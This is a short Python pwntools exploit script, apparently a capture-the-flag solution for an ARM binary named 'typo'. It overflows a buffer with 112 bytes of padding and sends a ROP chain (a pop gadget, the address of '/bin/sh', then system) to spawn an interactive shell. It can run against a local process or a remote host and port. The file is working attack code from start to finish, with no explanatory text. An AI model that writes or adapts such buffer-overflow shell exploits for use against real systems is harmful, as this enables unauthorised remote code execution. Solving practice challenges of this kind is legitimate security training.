#!/usr/bin/env python3

from pwn import *

localfile = "./typo"
# locallibc = ""
context.binary = localfile
context.log_level = "debug"
pf      = lambda name,num           :log.info(name + ": 0x%x" % num)
g       = lambda x                  :next(libc.search(asm(x)))

"""
0x00020904 : pop {r0, r4, pc}
0x0006c384 : /bin/sh
"""
def exp():
    system_addr = 0x110B4
    io.recvuntil("Input ~ if you want to quit")
    io.sendline()
    io.recvuntil("------Begin------")
    io.send(b"A"*112 + p32(0x20904) + p32(0x6c384) + p32(0xdeadbeef) + p32(system_addr))

    io.interactive()

argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

elf = ELF(localfile)
# libc = ELF(locallibc)
exp()
